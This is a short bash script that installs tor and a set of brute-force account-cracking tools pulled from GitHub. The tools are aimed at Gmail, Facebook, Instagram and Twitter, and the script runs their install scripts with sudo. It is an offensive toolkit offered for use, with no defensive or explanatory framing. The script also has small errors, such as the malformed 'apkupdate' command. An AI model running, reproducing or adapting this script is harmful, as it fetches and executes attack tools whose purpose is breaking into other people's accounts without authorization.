#!/bin/bash
git pull
#Sysupdate
sudo apkupdate >> /dev/null
#Python
sudo apk add python tor perl -y
#gmail
git clone https://github.com/Ha3MrX/Gemail-Hack.git
#facebook
if [ -d facebook ]; then
        echo "Directory facebook exists.[✔]"
else
	mkdir facebook
	cd facebook
	wget raw.githubusercontent.com/Sup3r-Us3r/scripts/master/fb-brute.pl
	cd ..
fi
#Instagram
git clone https://github.com/Deliander/instainsane.git
cd instainsane
chmod +x instainsane.sh
chmod +x install.sh
sudo bash install.sh
cd ..
#Twitter
git clone https://github.com/neight-1/-tweetshell-.git
cd ./-tweetshell-
chmod +x tweetshell.sh
chmod +x install.sh
sudo bash install.sh
cd ..
# instagram 2
git clone https://github.com/Deliander/insta-bf.git
cd insta-bf 
chmod +x * -R
